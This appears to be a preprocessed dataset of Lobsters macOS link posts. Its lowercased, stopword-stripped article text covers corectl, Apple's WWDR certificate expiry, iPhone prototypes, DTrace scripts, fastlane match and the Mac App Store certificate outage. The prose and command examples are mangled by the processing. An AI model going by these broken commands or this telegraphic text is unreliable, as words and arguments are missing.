supported become deprecated feature may disappear point future format label format label newly created volume within transient vm simplest way formatting choose filesystem like assuming coreos supported one corectl run name foo corectl ssh foo sudo b devvda sudo devvda rkthdd corectl halt foo labeled volume rkthdd signature recipe expects relying label volume identification get around issue otherwise depending actual volume name devvd would hardcoded issue one mix matching multiple recipe dealing different volume start docker rkt playground uuiddeadbeefdeaddeaddeaddeaddeafbeef corectl run volume absoluteorrelativepathtopersistentimg cloudconfig examplescloudinitdockeronlywithpersistentstoragetxt cpu memory name containerland start vm named containerland volume created previously attached virtual core ram provided cloudconfig format given volume nt yet bind mount varlibrkt varlibdocker top docker also become available socket activation passed argument vm via environment variable command flag way fully supported use whatever suit need better corectl p server version go version built mon jul west osarch pid uptime minute ago activity active vms total memory total vcores uuid name containerland version channel alpha vcpus memory mb pid uptime minute ago see world true cloudconfig usersamcodecorectlsrcgithubcomgeneveracorectlexamplescloudinitdockeronlywithpersistentstoragetxt network volume devvda usersamcodecorectlpersistentdatavarlibdockerimg docker h corectl q containerland ip image repository tag image id created size centos latest day ago mb busybox latest day ago mb fedora latest day ago mb corectl ssh containerland coreos stable last login mon jul update strategy reboots corectl ssh containerland sudo rkt list uuid app image name state created started network running vms become reachable name transparently host using macos native name resolution machinery ping c containerland ping containerlandcoreoslocal data byte byte m containerlandcoreoslocal ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m fun tracing thanks hyperkit consume corectldrunner available number static dtrace probe simplify investigation performance problem list probe supported version corectl type following command corectld running sudo dtrace l p hyperkit target p pgrep corectldrunner refer script examplesdtrace directory example possible usage available probe project using corectl rima mocevicius entire toolset macos gui apps using corectl underneath become part genevera project acknowledgement contributing corectl open source project released apache license version contribution sugestions gladly welcomed
624,Lobsters,mac,Apple macOS,Apple WWDR Intermediate Certificate Expiration,https://developer.apple.com/support/certificates/expiration/index.html,apple wwdr intermediate certificate expiration,apple worldwide developer relation intermediate certificate expiration renewed certificate receipt validation programming guide need take action renewed certificate apple wallet pass mac apps safari extension o x el capitan safari push notification app store submission known issue xcode unable create distribution build app store submission enterprise apps renewed certificate o x el capitan mac app store purchase failing launch renewed certificate safari extension builder unable locate safari extension signing certificate o x el capitan safari o x yosemite maverick need regenerate certificate need recompile resubmit apps pass safari extension customer affected certificate renewal apps development continue working inhouse enterprise io apps continue working renewed certificate expire,apple worldwide developer relation intermediate certificate expiration help protect customer developer require third party apps pass apple wallet safari extension safari push notification app store purchase receipt signed trusted certificate authority apple worldwide developer relation certificate authority issue certificate use sign software apple device allowing system confirm software delivered user intended modified previous apple worldwide developer relation certification intermediate certificate expired february renewed certificate must used signing apple wallet pass push package safari push notification safari extension submission app store mac app store app store apple tv developer download install renewed certificate development system server apps remain available app store io mac apple tv since different method used validating receipt delivering remote notification recommend test service ensure implementationspecific issue exist apps may experience receipt verification failure receipt checking code make incorrect assumption certificate make sure code adheres receipt validation programming guide resolve receipt validation issue need take action developer provide pass apple wallet deliver safari push notification create safari extension submit apps app store mac app store app store apple tv need download renewed certificate take following action apple wallet pass update pas signing server replace expired certificate renewed certificate february date apps generate pass apple wallet able install new pass server updated mac apps verify receipt validation code compatible renewed certificate test production environment mac app store update o x snow leopard available via o x software update safari extension install renewed certificate build extension february certificate available safari extension builder update signing system o x el capitan order build update extension existing safari extension continue run expected safari push notification update notification package signing server include web push certificate renewed intermediate certificate february date new user able sign push notification website server updated using function sign push package web push certificate pas path renewed intermediate extra certificate parameter app store submission submission app store mac app store app store apple tv february must utilize renewed certificate new app submission compiled expired intermediate returned developer known issue xcode unable create distribution build app store submission enterprise apps issue occurs expired wwdr intermediate certificate present system keychain login keychain within keychain access application resolve issue first download install renewed certificate next keychain access application select system keychain select show expired certificate view menu delete expired version apple worldwide developer relation certificate authority intermediate certificate certificate appear valid keychain access available xcode issue resolved o x el capitan mac app store purchase failing launch scenario app purchased mac app store utilizes receipt validation may fail launch exiting error code since considers local receipt includes expired wwdr intermediate certificate invalid macos regard receipt valid updated wwdr intermediate present system therefore request updated receipt application resolve issue delete renewed nonexpired wwdr intermediate certificate system andor login keychain within keychain access application relaunching application prompted mac app store login credential order obtain new receipt application launched application obtained valid receipt reinstall renewed certificate continue development issue fixed forthcoming update o x el capitan safari extension builder unable locate safari extension signing certificate building update extension safari extension builder safari earlier encounter issue safari extension builder fails recognize safari extension signing certificate certificate available safari extension builder update signing system o x el capitan install safari o x yosemite maverick order build update extension need regenerate certificate existing certificate work expiring renewed intermediate certificate need recompile resubmit apps pass safari extension need recompile resubmit currently deployed apps pass safari extension continue run expected keep mind submission app store update pass extension made february must use renewed certificate customer affected certificate renewal customer purchased installed io apps tvos apps safari extension affected certificate renewal user running o x el capitan may receive notification mac app damaged utilizes receipt validation request new receipt apple resolve issue restarting mac updating o x el capitan later mac app store customer running o x snow leopard unable purchase new apps run previously purchased apps utilize receipt validation install mac app store update o x snow leopard available via o x software update apps development continue working yes development version apps continue run provisioning profile used compile expires revoke signing certificate inhouse enterprise io apps continue working yes inhouse enterprise io apps deployed continue run expected provisioning profile used compile expires revoke signing certificate renewed certificate expire renewed apple worldwide developer relation certification intermediate certificate expire february
625,Lobsters,mac,Apple macOS,Apple iPhone Prototypes Revealed During Samsung Lawsuit,http://bgr.com/2015/12/07/apple-secrets-iphone-ipad-samsung-lawsuit/,apple iphone prototype revealed samsung lawsuit,agreed pay apple samsung apple miss sorry fallout witcher game year close crazy iphone prototype iphone project started early ipad prototype featured kickstand apple wanted original iphone curved apple tossed around idea car year ago apple car might look like apple keep io source code locked apple hated samsung next big thing already ad campaign apple conduct market research iphone demand every month steve job viewed iphone v android battle holy war apple product roadmap well thought advance apple kicking around idea tv subscription iphone buyer use case,following contentious patent battle raged nearly five year samsung last week finally agreed pay apple million damage infringing upon number iphone ipad patent samsung may still holding hope may someday recover million seems finally start closing book widely publicized patent dispute recent memory one saw apple samsung battle courtroom across corner globe miss sorry fallout witcher game year close one interesting aspect apple legal battle samsung gave u unprecedented look behind veil secrecy typically shroud aspect apple product development daytoday operation course discovery innumerable court filing fascinating trial inner working apple brought forefront first time history photograph iphone prototype apple conduct market research apple legal battle samsung provided tech enthusiast treasure trove previously topsecret information samsung agreeing pony damage thought good time take step back reminisce take look interesting nugget information hardfought patent dispute brought light crazy iphone prototype without question one intriguing item emerge apple samsung trial number iphone prototype never ended seeing light day brief selection interesting design seen iphone prototype side interesting downright bizarre design good measure thankfully apple never opted black white design one earliest known iphone prototype notice o us circular dot indication signal strength rather vertical bar apple would eventually implement five circular dot shipping iphone jony ive granted full control look feel io also tell extremely early iphone prototype based icon used many simply copy o x counterpart another point interest note home button menu label glad apple never fully pursued prototype design lastly bulky iphone prototype look like might inspired iphone design iphone project started build throughout trial apple executive provided u incredibly detailed information surrounding early day iphone development interesting tidbit emerge include following early beginning software control iphone team given scott forstall steve job giving forstall free rein hire anyone division within company team job also told forstall hire anyone outside company pitching project prospective team member forstall even tell working rather forstall cryptically told opted join would work hard give night work weekend year mincing word forstall also told prospective team member choose accept role work harder ever entire life initial development iphone referred project purple took place separate building forstall likened dorm people time smelled like pizza forstall said security airtight building iphone development taking place replete video camera card reader testifying forstall said worker team would show badge five six time able access key development area original iphone team put fight club poster wall well first rule project purple talk project purple forstall said amount work went creating original io interface monumental devoted year life doubletap zoom feature dreamt forstall grew weary constantly enacting pinchtozoom reading text webpage though likely larger size apple iphone team strong software aside trial also gave u unprecedented look industrial design team tasked housing apple software innovative sleek hardware testifying trial long time apple industrial designer christopher stringer relayed number interesting nugget information hardware industrial design apple industrial design group time iphone development consisted maniacal individual share one singular purpose imagine product exist guide life apple industrial design group collaborates closely often exchange sketch idea current upcoming product around single table feedback suggested design stringer explained often brutally honest iterative process extensive instance single design element result proposed mockups apple industrial design group work closely technical liaison provide designer extensive feedback regarding various design affect issue durability droptesting early ipad prototype featured kickstand though microsoft surface actually feature kickstand apple coming earliest ipad prototype also experimented idea incorporating kickstand device apple wanted original iphone curved trial stringer also revealed original idea first iphone release device featuring two curved piece glass idea ultimately abandoned however technology needed cut glass apple specification expensive time scale still prototype curved device built seen apple tossed around idea car year ago stand apple executive phil schiller said company open anything brainstorming product idea build success ipod searching ipod would make sense schiller said make ipod else idea tossed around included dedicated camera car assortment crazy stuff interestingly enough former apple executive tony fadell relayed week ago job back talked apple car might look like apple keep io source code locked ahead apple samsung trial apple henri lamiraux key vp io engineering retired submitted following declaration court effort keep portion apple io source code sealed apple source code provided highest level protection security within apple physical access io source code limited select group authorized apple employee access provided portion cod needtoknow basis access limited employee directly involved software development management security employee access must approved management authorized employee account must specifically granted access apple hated samsung next big thing already ad campaign samsung string welldone ad lampooning stereotypical apple fan private email made public trial apple phil schiller hated apple adequate response samsung jab event went far suggest tim cook company needed hire brand new ad agency wake samsung ad aired schiller sent following email one ad contact tbwachiatday pretty good cant help think guy feeling like athlete miss zone struggle nail compelling brief drastic change fast note one prominent antiapple samsung ad seen look closely even see brief cameo silicon valley character nelson big head bighetti video apple conduct market research iphone demand every month steve job may famously declared apple market research exactly case course apple samsung trial apple vp iphone io product marketing greg joswiak said apple survey user month across multiple country survey reveal joswiak explained countrybycountry driving customer buy apple iphone product versus product android product samsung sell feature use customer demographic level satisfaction different aspect iphone case apple aware iphone preference vary exacting detail across individual country also interesting market research kept closely guarded often circulates within small group apple executive iphonerelated survey ipadrelated survey allowed distributed anyone outside group without personal express permission regularly refuse joswiak added approve distribution almost always survey questionbysurvey question basis even distribution limited individual demonstrated need know steve job viewed iphone v android battle holy war perhaps terribly surprising given job famous threat go thermonuclear google october email steve job referenced holy war google notably email sent month apple sued samsung apple product roadmap well thought advance another portion steve job email reveals apple back october already planning lte support talking iphone hardware nearly full two year would actually launch also see job reference releasing ipad stay ahead competitor apple kicking around idea tv subscription job email interesting tidbit iphone buyer use case apple survey revealed upwards iphone user buy case device life long mac user apple enthusiast yoni heisler writing apple tech industry large year writing appeared edible apple network world maclife macworld uk recently tuaw writing analyzing latest happening apple yoni enjoys catching improv show chicago playing soccer cultivating new tv show addiction recent example walking dead broad city
626,Lobsters,mac,Apple macOS,Top 10 DTrace scripts for Mac OS X (2011),http://dtrace.org/blogs/brendan/2011/10/10/top-10-dtrace-scripts-for-mac-os-x/,top dtrace script mac o x,top dtrace script mac o x dtrace instrument dtracetoolkit use dtrace open terminal customize terminal screen running top running dtrace click admin status script iosnoop hfsslowerd dtrace book dtrace book tarball execsnoop opensnoop dtruss ryan dahl nodejs soconnectmacd dtrace book soacceptmacd errinfo bitesized iotop maclifed script dtrace book script dtrace book instrument cloud analytics example tagged dtrace dtraceorg dtrace guide dtrace book dtrace page dtracetoolkit top ten dtrace script exploring leopard dtrace mac o x performance checklist,top dtrace script mac o x since version leopard mac o x dtrace tool used performance analysis troubleshooting provides data apple instrument tool well collection command line tool implemented dtrace script familiar latter wrote original dtracetoolkit apple customized enhanced mac o x shipped default great use regularly answer question macbook slow work office everyone macbook pro macbook slow common question application become slow unresponsive waiting cpu work memory request disk io complete people try ignore slowdown question become macbook fan loud standard performance analysis tool like activity monitor top thirdparty tool based foundation tell key information activity system much cpu consumption caused shortlived process process causing disk io dtrace however see everything post cover top ten mac o x dtrace script use figuring laptop slow application misbehaving script already installed new dtrace book use dtrace never run dtrace script even used command line basic walkthrough open terminal run terminal application find finder also type terminal spotlight magnifying glass top right corner mac screen find usually drag dock easy find later customize terminal first run terminal probably look like find default font small hard read size window term character also small column row presumably pay homage original unix terminal size unix mac o x unix hood darwin kernel adjust font liking terminal preference text use monaco antialias text window tab default size also increase later clicking dragging bottom right corner terminal example screen write blog post terminalbased text editor running top dtrace see everything thing already covered easytouse easytotype tool like top terminal running type top cpu hit enter refresh screen showing top running process type q exit top program output look something like brendan top cpu pid command cpu time th wq port mregs rprvt rshrd rsize firefoxbin top terminal google chrom truncated header block include column look cpu column see process making cpu busy rsize column see consuming main memory busiest cpu process top since sorted cpu cpu top firefoxbin mozilla firefox cpu term single processor two firefox stayed high could look responsible tab close restart firefox top turn dtrace running dtrace dtrace requires admin privilege use usually need type password authenticate provided administrator access sure click see check run dtrace prefixing dtrace command sudo prompt password first time around time dtrace command running usually type ctrlc end example brendan sudo iosnoop password password uid pid block size comm pathname w tweetdeck w tweetdeck local w tweetdeck local w tweetdeck local w tweetdeck local c brendan macbook sudo say permission denied check admin status happens forgot sudo brendan iosnoop dtrace failed initialize dtrace dtrace requires additional privilege script script follow note style script end basic dtrace script shellwrapped script provides command line option use h list like learn dtrace recommend starting reading basic one iosnoop trace disk io execution live time disk io completes line output printed summarize including process name filename detail brendan sudo iosnoop uid pid block size comm pathname r google chrome r google chrome w adium w tweetdeck local w tweetdeck local w tweetdeck local w tweetdeck local w tweetdeck local w google chrome defaultcookiesjournal w google chrome defaultcookiesjournal w google chrome defaultcookies w google chrome defaultcookies w google chrome defaultcookies w google chrome defaultcookies let instantly find application using disk file reading writing disk io typically slow nonssd disk application calling frequent disk io dozen per second may run slowly wait disk io complete output column show uid user id pid process id unique identifier process direction r read w write block location disk size io size byte comm process name pathname trailing portion file pathname output caught google chrome reading cache file writing cookie file cookiesjournal cooky tweetdeck also wrote database file path information end iosnoop darwin programmer want take swing improving see fipathname translator usrlibdtraceiod h option list option need sudo brendan iosnoop h usage iosnoop aadeghinostv device f filename mountpoint n name p pid iosnoop default output print data mostly dump data space delimited print time delta u elapsed e print device name g print command argument print device instance n print major minor number print disk delta time u print start time u print completion time u v print completion time string device instance name snoop f filename snoop file mountpoint f n name process name p pid pid eg iosnoop v human readable timestamps iosnoop n print major minor number iosnoop snoop event filesystem tricky performance issue often use stod get start end timestamps io microsecond couple different type io time calculation hindsight called diskiosnoop since io could refer different location kernel io stack hfsslowerd script answer iosnoop faq dosen iosnoop see application disk io reason application rarely request disk io directly rather access file system disk io behalf increase performance file system usually try cache much file data possible main memory dram application may notion think disk io actually reading fast dram thanks file system writes also buffer dram write disk later also speed application performance hfsslowerd script measure io processed hf file system apple current default file system iosnoop measure io file system reach disk couple point hfsslowerd see lot io iosnoop includes file system cache hit hfsslowerd better reflects application performance measure latency application directly suffered hfsslowerd script dtrace book found run need create text file containing script pull dtrace book tarball make file executable terminal running chmod hfsslowerd script take argument minimum number millisecond show io tracing hf io slower brendan sudo time process kb m file sep google chrome r sep google chrome r sep google chrome r sep google chrome r sep tweetdeck w sep adium r smilepng sep firefoxbin w sep firefoxbin w sep firefoxbin w sep firefoxbin w sep firefoxbin w sep firefoxbin w sep firefoxbin w sep firefoxbin r sep firefoxbin w sep firefoxbin w sep firefoxbin w sep firefoxbin r timesdfont namedforkrsrc sep fontd r annexaux sep firefoxbin w column time time io completion process application name direction r read w write kb io size kbytes m io latency millisecond file filename use argument trace everything chasing slow io often use argument io slower millisecond point may think care slow io use iosnoop work point slow io caused something disk file system lock contention example advantage hfsslowerd script measured latency match application pain suffered whereas disk level assume correlation execsnoop trace execution new process great identifying shortlived process may caused misbehaving application slow system shortlived process usually quick picked standard monitoring tool like activity monitor top demonstrate tool happens type man l brendan sudo execsnoop v strtime uid pid ppid args sep man sep man sep sh sep gzip sep sh sep man sep gzip sep man sep le sep sh sep gzip sep tbl sep groff sep troff sep grotty print line new process executed rolling output similar previous tool field strtime string timestamp uid user id pid process id ppid parent process id args process name process argument yet work mac o x want debug see prpsargs usrlibdtraceprocd happens turn airport wifi brendan sudo execsnoop v strtime uid pid ppid args sep airportd sep fontworker sep mdnsresponderhel sep autofsd sep managedclient sep fontworker sep airportd sep mdnsresponderhel sep fontworker sep kerberosautoconf sep kerberosautoconf sep autofsd sep managedclient sep ocspd sep google chrome sep fontworker near end opened new tab mozilla firefox another google chrome see fundamental difference chrome creates new process tab firefox execsnoop various option use h list used v print time opensnoop trace file open print various detail including time error code using usually use look failed open sign misconfigured application discovering config file resource file also useful brendan sudo opensnoop strtime uid pid comm fd err path sep directoryservic vardbdslocalnodesdefaulthosts sep directoryservic etchosts sep dtrace etclocaltime sep systemuiserver sep systemuiserver systemlibrarycoreservicesmenu extrastimemachinemenucontentsresourcestmrotatingarrowpdf sep systemuiserver systemlibrarycoreservicesmenu extrasclockmenucontentsresourcesclockpdf sep systemuiserver systemlibrarycoreservicesmenu extrastimemachinemenucontentsresourcestmrotatingarrowpdf sep tweetdeck sep tweetdeck usersbrendanlibrarycookiescookiesplist sep google chrome sep md c tracing changed clock top bar digital analogue file opened performed seen systemuiserver process beginning preference file pdfs huh pdfs pdfs bizarre know tiny icon implemented pdfs dtruss previous two tool opensnoop execsnoop operate tracing specific system call system call syscall application performs request operating system kernel perform privileged work including process creation file operation io eg disk network io syscalls great target analysis dtrace since examining often provides pretty good picture application trying also provide useful detail including byte count file process name error code latency dtruss tool trace type system call useful general debugging especially since mac o x come standard syscall tracer like linux strace solaris truss one advantage dtruss tool dtruss trace multiple process time matching process name n example tracing firefox via process name firefoxbin brendan sudo dtruss n firefoxbin pidthrd syscall args return writenocancel lseek readnocancel writenocancel lseek readnocancel selectnocancel readnocancel recvfromnocancel err selectnocancel sendtonocancel writenocancel lseek output many page application commonly make frequent system call dtruss also launch trace program humble l l command traced brendan sudo dtruss l l hfsslowerd rwxrxrx brendan staff jan hfsslowerd syscall args return ioctl close mmap line truncated opennocancel err listxattr ioctl access opennocancel readnocancel closenocancel writenocancel rwxrxrx brendan staff jan fchdir fchdir closenocancel line trimmed keep example short dtruss support various option including printing system call timing use analyzing performance brendan dtruss h usage dtruss acdefholls syscall p pid n name command p pid examine pid n name examine process name syscall examine syscall print detail c print syscall count print relative time u e print elapsed time u f follow child l force printing pidlwpid print cpu time print stack backtraces l nt print pidlwpid b bufsize dynamic variable buf size eg dtruss df h run examine df h dtruss p examine pid dtruss n tar examine process called tar dtruss f testsh run testsh follow child used e option many time figure slowing application show elapsed time system call microsecond brendan dtruss e l l hfsslowerd rwxrxrx brendan staff jan hfsslowerd elapsd syscall args return mmap mmap mmap open sysctl look elapsd column largest time dtruss faq output wrong order dtrace tracing style tool print line output occur output shuffled slightly due cpu buffering multicpu system option relative time since program start useful case output order important postsort column dtruss output correct order example redirecting output file using sort command column ryan dahl creator nodejs using dtruss frequently recently made enhancement posted newer version github soconnectmacd script dtrace book trace outbound tcp connection along detail brendan sudo pid process fam address port lat u result firefoxbin progress tweetdeck progress tweetdeck progress google chrome progress firefoxbin progress firefoxbin progress firefoxbin progress firefoxbin progress firefoxbin progress firefoxbin progress ntpd success quick way find application connecting internet script column pid process id process process name fam protocol family address ip address port tcp destination port lat u latency connect system call microsecond result return connect many connection day nonblocking latency appears low result progress actual connection completes sometime later timing traced using dtrace desired companion tool soacceptmacd show inbound tcp connection ran regularly may catch something performing networking eg spyware virus errinfo tool provides summary system call failing showing process name error code short description error brendan sudo errinfo c tracing hit ctrlc end c exec syscall err count desc tweetdeck file directory tweetdeck select bad file descriptor tweetdeck file directory cupsd unlink file directory firefoxbin connectnocancel operation progress launchd mkdir file exists launchd opennocancel file directory google chrome google chrome mdworker getattrlist file directory mdworker mkdir permission denied tweetdeck access file directory tweetdeck read resource temporarily unavailable mdnsresponder recvmsg resource temporarily unavailable mdworker file directory gpgagent readnocancel resource temporarily unavailable thnuclnt ioctl inappropriate ioctl device ntpd pthreadcanceled invalid argument ntpd sigreturn ntpd sigsuspend interrupted system call google chrome activitymonitor procinfo process another quick way track failing misconfigured application note usually system call error problem normal system call fail calling application handle condition correctly errinfo particularly useful application handle failure correctly system call silently failing bitesized simple dtrace script characterizes disk io workload showing distribution size io byte along application name brendan sudo bitesized tracing hit ctrlc end c pid cmd value distribution count google value distribution count value distribution count value column show minimum size io byte count column show number io range minimum size next size shown follow example bsdtar command shown performed disk io byte byte size io fell text plot middle provides visualization distribution event show spike corresponds range google chrome couple dozen io kbytes disk io expensive operation usually preferable larger size improve throughput device iotop present data iosnoop summarized way similar top handy disk io frequent iosnoop verbose want high level summary process rattling disk used cp clear screen provide rolling output c show disk busy percentage p brendan sudo iotop cp tracing please wait sep load diskr kb diskw kb uid pid ppid cmd device maj min io cp w sep load diskr kb diskw kb uid pid ppid cmd device maj min io cp w sep load diskr kb diskw kb uid pid ppid cmd device maj min io cp r cp w sep load diskr kb diskw kb uid pid ppid cmd device maj min io tweetdeck w launchd w cp r cp w detail yet available dtrace reason described iosnoop script programmer see need fixed usrlibdtraceiod file get dynvardrops sorry back wrote year ago never saw disk workload heavy enough cause remedy increase dynvarsize tunable adding following line pragma option near one pragma option quiet usrbiniotop may want make backup iotop first iotoporig copy somewhere else run maclifed script dtrace book trace creation deletion file brendan sudo time m uid pid process call dirfile google chrom vnopcreate google chrom vnopcreate google chrom vnopremove google chrom vnopcreate tmpcomgooglechrometlloje google chrom vnopremove tmpcomgooglechrometlloje google chrom vnopcreate tmpcomgooglechromeyiwtde google chrom vnopremove tmpcomgooglechromeyiwtde tweetdeck vnopcreate tweetdeck vnopremove local tweetdeck vnopcreate local tweetdeck vnopcreate local tweetdeck vnopremove local adium vnopcreate thnuclnt vnopcreate thnuclnt vnopremove thnuclnt vnopremove thnuclnt vnopremove thnuclnt vnopremove thnuclnt vnopremove vim vnopcreate vim vnopremove vim vnopcreate vim vnopremove interesting tracing saved file editing vim seen last four line tell vim creating removing temporary file part save process also note look like tweetdeck created file twice removing two vnopcreates followed vnopremove correct order seen examining time m column sideeffect dtrace negligible performance impact design output slightly shuffled due way collect data percpu buffer often include time column like one usefulness knowing time also mean post sort output script tool readytogo mac o x run man k dtrace command terminal apropos dtrace see following output brendan man k dtrace bitesized analyse disk io size process us dtrace cpuwalkd measure cpu process run us dtrace creatbyprocd snoop creat process name us dtrace dappprof profile user lib function usage us dtrace dapptrace trace user library function usage us dtrace diskhits disk access file offset us dtrace dispqlend dispatcher queue length cpu us dtrace dtrace generic frontend dtrace facility dtruss process syscall detail us dtrace errinfo print errno syscall fails us dtrace execsnoop snoop new process execution us dtrace fddist file descriptor usage distribution us dtrace filebyprocd snoop open process name us dtrace hotspotd print disk event location us dtrace httpdstatd realtime httpd statistic us dtrace iofiled io wait time file process us dtrace iofilebd io byte file process us dtrace iopattern print disk io pattern us dtrace iopending plot number pending disk event us dtrace iosnoop snoop io event occur us dtrace iotop display top disk io event process us dtrace killd snoop process signal occur us dtrace lastwords print syscalls exit us dtrace loadsd print load average us dtrace newprocd snoop new process us dtrace opensnoop snoop file open occur us dtrace pathopensd full pathnames opened ok count us dtrace pidpersecd print new pid per sec us dtrace plockstat frontend dtrace print statistic posix mutexes readwrite lock priclassd priority distribution scheduling class us dtrace pridistd process priority distribution us dtrace procsystime analyse system call time us dtrace runoccd run queue occupancy cpu us dtrace rwbypidd readwrite call pid us dtrace rwbytyped readwrite byte vnode type us dtrace rwsnoop snoop readwrite event us dtrace sampleproc sample process cpu us dtrace seeksized print disk event seek report us dtrace setuidsd snoop setuid call occur us dtrace sigdistd signal distribution process us dtrace syscallbypidd syscalls process id us dtrace syscallbyprocd syscalls process name us dtrace syscallbysyscd syscalls syscall us dtrace topsyscall top syscalls syscall name us dtrace topsysproc top syscalls process name us dtrace weblatencyd website latency statistic us dtrace plus dtrace book dtrace running script write custom script run oneliners use higherlevel tool use dtrace behind scene like apple instrument joyent cloud analytics macbook using server dtrace available use diagnose performance issue including tracing kernel application code regularly use see mysql database interacts kernel file system example reading dtrace see post tagged dtrace blog dtraceorg original page dtrace guide page dtrace book original dtrace page includes dtracetoolkit little old think prustat need updating also matty top ten dtrace script includes greg miller exploring leopard dtrace includes objectivec tracing another post mac o x performance see use methodbased mac o x performance checklist
627,Lobsters,mac,Apple macOS,"Use new fastlane tool ""match"" to fix code-signing problems",https://codesigning.guide/,use new fastlane tool match fix codesigning problem,new approach code signing best practice guide manage certificate provisioning profile development team apple doc solution keep key insync git one code signing identity expand,new approach code signing best practice guide manage certificate provisioning profile development team wait code signing code signing required io distributing app customer assures app trusted modified since last signed see apple doc general detail code signing solution keep key insync git central place code signing identity profile kept anyone access build process way entire team use account one code signing identity without manual work confusion instead registering yet another service use separate private git repo sync profile across multiple machine use git code signing basic requirement one code signing identity shared across team easiest way create new apple id team eg iosdev companycom use get started first create new private git repo store profile next create new private key certificate environment distribution development store private key certificate git repo create new provisioning profile various target development app store ad hoc matching certificate store git repo committing file git recommended encrypt file eg using openssl machine access git repo install latest certificate provisioning profile certificate private key imported keychain either using finder using security import command provisioning profile copied librarymobiledeviceprovisioning profile xcode project must configured choose provisioning profile automatically define statically ideal solution pas uuid provisioning profile via environment variable bundle identifier future add new device ad hoc development provisioning profile update profile git repo thing consider make sure provisioning profile created using correct certificate app multiple target eg today widget repeat target set provisioning profile xcode project automatic always select correct profile secure expand key provisioning profile encrypted using openssl using passphrase storing private key git repo may sound offputting first indepth analysis potential security issue came following conclusion could happen someone stole private key attacker would certificate provisioning profile could codesign application bundle identifier worst could happen profile type app store profile app store profile ca nt used anything long resigned apple way get app resigned submit app review take around day attacker could submit app review also got access itunes connect credential stored git local keychain additionally get email notification every time build get uploaded cancel submission even app get review stage development ad hoc profile general profile harmless used install signed application small subset device add new device attacker would also need apple developer portal credential stored git local keychain enterprise profile attacker could use inhouse profile distribute signed application potentially unlimited number device would run company name could eventually lead apple revoking inhouse account however easy revoke certificate remotely break app device potentially dangerous nature inhouse profile please use match enterprise profile caution ensure git repository private use secure password sum full control access list git repo third party service involved even certificate leaked ca nt used cause harm without itunes connect login credential use inhouse enterprise profile match caution use github bitbucket encourage enabling factor authentication account access certificate repo
629,Lobsters,mac,Apple macOS,OS X and the Unremovable File (2013),http://galvanist.com/post/67485688849/os-x-and-the-unremovable-file,o x unremovable file,,
630,Lobsters,mac,Apple macOS,No One Minding the Store,http://mjtsai.com/blog/2015/11/12/no-one-minding-the-store/,one minding store,apps launch complicated case single point failure neglected paul haddad dan counsell tom harrington jonathan wight rainer brockerhoff mike ash drew mccormack lukas mathis kirk mcelhearn craig hockenberry craig hockenberry bare bone software daniel jalkut jim matthew mihira jayasekera guardian john gruber matt berg steven frank daniel jalkut paul haddad andrew wickliffe michael yacavone michael gorbach pierre lebeaupin rene ritchie paul haddad philip elmerdewitt matt stevens using receipt creation date apple sample code current time keith gugliotto jim matthew nick heer graeme devine shawn king core intuition glenn fleishman rainer brockerhoff benjamin mayo rainer brockerhoff pierre lebeaupin gu mueller user accidental tech podcast dan moren tom harrington john gruber rob griffith apple software quality bug code signing drm dropdmg eaglefiler gatekeeper mac mac app mac app store sandboxing top post comment r feed,woke inbox full email customer reporting apps launch included new customer purchased mac app store well people purchased long ago made change expected thing would keep working mac dash launch entered apple id password app store account customer fix complicated restarting mac deleting redownloading app middle using readkit suddenly quit launch o reporting damaged however redownloading app work restart mac get running got password dialog tweetbot case seems way get app store version working pointed customer direct sale version apps issued temporary serial number fortunately apps require icloud map kit system service withheld store apps mac app store supposed make thing easier also single point failure neglected sometimes even existing functionality stop working mac o x introduced code signing bug prevented submitting update several month june monthlong itunes connect bug prevented uploaded build entering review queue currently bug fix update apple reviewing day day waiting inquired status apple told everything normal keep waiting short system broken multiple level evidence suggest thing get better paul haddad show expired certificate seems source problem dan counsell show flurry app damaged dialog tom harrington every single app downloaded mac app store failing launch variety error every one jonathan wight um launching photoshop ma acorn opening due maspocolypse rainer brockerhoff damaged screen seems gatekeeper glitch fixed reboot apps check expiring receipt cert mike ash turn app store another drm scheme nonsense dysfunction implies thunk drew mccormack whoa serious mac app store problem delivering binary user still waiting review crashing receipt validation pull app store otherwise customer upgrade left nonfunctioning app lukas mathis also apple bought app computer yesterday worked fine kirk mcelhearn seriously bunch noobs update craig hockenberry verified need reboot work around mac app store certificate problem instead killall kill storeaccountd craig hockenberry dialog say yourapp damaged customer going contact apple worse way u proactive situation fricken idea affected apple customer contact information bare bone software restart computer necessary step app store code signing certificate expired restarting clear local certificate cache necessary ala always sufficient daniel jalkut mac app store meltdown le developer heeded apple advice validating receipt better look customer today jim matthew get ma fetch launch o mihira jayasekera mobilemelevel brand tarnishing guardian apple respond request comment update john gruber inexcusable service absolutely essential user developer harsh word see anyone could disagree matt berg many product feel way stretched thin apple watch lost focus steven frank every aspect ma cert thing completely infuriating daniel jalkut spent lot year sarcastic optimistic mac app store guess patience like many others worn thin anything else sandboxing assumption future mac app store shaped priority last year paul haddad show review customer whose app stopped launching andrew wickliffe show reply apple support encouraging post review mac app store hope developer contacting ironic apple let developer contact customer post review customer emailed say applecare told actually app store certificate come developer app apple apple approves certificate current position responsibility app developer fix think incorrect apple sign apps store distributes certificate submitting mac app store expired furthermore applecare explanation correct workarounds entering password redownloading app restarting mac clear cache work anyone michael yacavone wishing favorite ma developer best apple dropped cert blamed devs sad situation everyone take month offi woke middle night thinking egregious apple behavior week toward devs michael gorbach apple nuking sideloading flux mac app store issue really feeling ecosystem angst today pierre lebeaupin unacceptable fundamental violation trust app developer customer placed apple namely bought installed compatible apps would keep working short dramatic action taken consumer protection would revoking certificate malicious developer turn supposed trust icloud apple map sure run app access service already even troubling implication longterm usage preservation software data rene ritchie expired apple issued new certificate one using secure hash algorithm supposed transparent old certificate expired people began experiencing problem first outdated certificate information stuck cache required people reboot reauthenticate order clear second apps apparently using old version openssl receipt validation guessed support hence compatible new certificate make sense although suspect also factor involved explain case heard paul haddad grabbed new mac app store receipt back using expiration date philip elmerdewitt security certificate apple installed protect user malware expired nov five year original nobody apple thought renew company fixed new certificate expires breaking untold number mac apps confusing inconveniencing countless mac owner matt stevens say developer need careful validate app store receipt using receipt creation date rather current time creation date field initially documented apple sample code us current time keith gugliotto know far receipt embedded mac app store apps became invalid yesterday happened without advance warning mothership apps reacted varied apps among affected worst way meantime giving away apps online store jim matthew november appears apple fixed issue copy fetch mac app store open drag trash empty trash download fresh copy app store nick heer today ongoing certificate expiration issue yet another reminder apple need commit talent resource mac app store get rid graeme devine post another response apple support blaming developer update shawn king huge embarrassment apple one explained apologized well giant pain point developer app stop working contact developer apple core 